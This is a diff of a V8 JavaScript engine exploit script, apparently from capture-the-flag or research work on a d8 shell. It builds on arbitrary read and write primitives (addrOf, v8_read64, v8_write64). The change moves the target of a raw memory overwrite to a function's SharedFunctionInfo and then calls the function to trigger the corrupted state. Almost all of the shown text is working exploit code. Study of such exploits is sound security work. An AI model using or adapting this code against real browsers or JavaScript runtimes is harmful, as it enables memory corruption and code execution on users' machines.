@@ -35,11 +35,26 @@ console.log("heap_addr: 0x" + heap_addr.toString(16));
 /// ========================================================================
 
 const dummy = new Int8Array(150);
-console.log("dummy addr: 0x" + (heap_addr + BigInt(addrOf(dummy))).toString(16));
-%DebugPrint(dummy);
-let base_offset = 0x24af3d+1;
-console.log(v8_read64(addrOf(dummy)+base_offset).toString(16));
-v8_write64(addrOf(dummy)+base_offset,0x11001002000c0f02n);
-console.log(v8_read64(addrOf(dummy)+base_offset).toString(16));
-%SystemBreak();
+
+// =============== debug =========================
+// console.log("dummy addr: 0x" + (heap_addr + BigInt(addrOf(dummy))).toString(16));
+// console.log("======================================================================");
+// %DebugPrint(dummy);
+// console.log("======================================================================");
+// %DebugPrint(foo);
+
+// console.log("foo: 0x" + addrOf(foo).toString(16));
+// console.log("foo_addr+0x10: 0x" + (v8_read64(addrOf(foo)+0x10) & 0xffffffffn).toString(16));
+// ========================== overwrite sfi ==========================
+let sfi = (v8_read64(addrOf(foo)+0x10) & 0xffffffffn)+ 0x20n;
+console.log("sfi: 0x" + sfi.toString(16));
+let write_addr = Number(sfi) - 7;
+
+console.log(v8_read64(write_addr).toString(16));
+v8_write64(write_addr,0x11001002000c0f02n);
+console.log(v8_read64(write_addr).toString(16));
+// ========================== trigger ==========================
+// %SystemBreak();
 foo(0);
+
+
